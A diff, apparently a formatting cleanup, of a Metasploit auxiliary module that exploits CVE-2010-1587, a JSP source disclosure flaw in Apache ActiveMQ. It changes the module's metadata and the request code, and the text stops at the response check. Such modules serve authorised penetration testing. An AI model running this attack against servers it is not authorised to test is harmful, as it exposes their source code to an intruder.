@@ -9,43 +9,49 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Apache ActiveMQ JSP Files Source Disclosure',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Apache ActiveMQ JSP Files Source Disclosure',
+        'Description' => %q{
           This module exploits a source code disclosure in Apache ActiveMQ. The
-        vulnerability is due to the Jetty's ResourceHandler handling of specially crafted
-        URI's starting with //. It has been tested successfully on Apache ActiveMQ 5.3.1
-        over Windows 2003 SP2 and Ubuntu 10.04.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          vulnerability is due to the Jetty's ResourceHandler handling of specially crafted
+          URI's starting with //. It has been tested successfully on Apache ActiveMQ 5.3.1
+          over Windows 2003 SP2 and Ubuntu 10.04.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Veerendra G.G', # Vulnerability discovery
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2010-1587' ],
           [ 'OSVDB', '64020' ],
           [ 'BID', '39636' ],
           [ 'URL', 'https://issues.apache.org/jira/browse/AMQ-2700' ]
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8161),
         OptString.new('TARGETURI', [true, 'Path to the JSP file to disclose source code', '/admin/index.jsp'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
-
     print_status("#{rhost}:#{rport} - Sending request...")
     uri = normalize_uri(target_uri.path)
     res = send_request_cgi({
-      'uri'          => uri,
-      'method'       => 'GET',
+      'uri' => uri,
+      'method' => 'GET',
     })
 
     if res and res.code == 200
